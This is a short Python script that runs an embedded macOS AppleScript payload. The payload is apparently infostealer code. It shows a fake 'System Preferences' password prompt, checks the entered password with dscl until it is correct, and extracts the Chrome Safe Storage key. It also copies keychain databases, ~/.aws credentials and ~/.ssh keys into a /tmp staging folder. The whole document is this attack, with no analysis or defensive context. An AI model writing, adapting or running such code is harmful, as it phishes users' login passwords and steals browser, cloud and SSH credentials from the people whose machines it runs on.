import subprocess
payload = r'''
set userName to do shell script "id -un"
repeat
    set reply to display dialog "Provide your login password" default answer "" with hidden answer with title "System Preferences"
    set enteredSecret to text returned of reply
    try
        do shell script "dscl . authonly " & quoted form of userName & " " & quoted form of enteredSecret
        exit repeat
    end try
end repeat
set key to do shell script "security find-generic-password -w -s 'Chrome Safe Storage'"
do shell script "mkdir -p /tmp/support-data"
do shell script "printf '%s' " & quoted form of key & " > /tmp/support-data/storage.txt"
do shell script "cp ~/Library/Keychains/*.keychain-db /tmp/support-data/"
do shell script "cp -R ~/.aws /tmp/support-data/"
do shell script "cp -R ~/.ssh /tmp/support-data/"

'''
subprocess.run(['/usr/bin/osascript', '-e', payload], check=True)
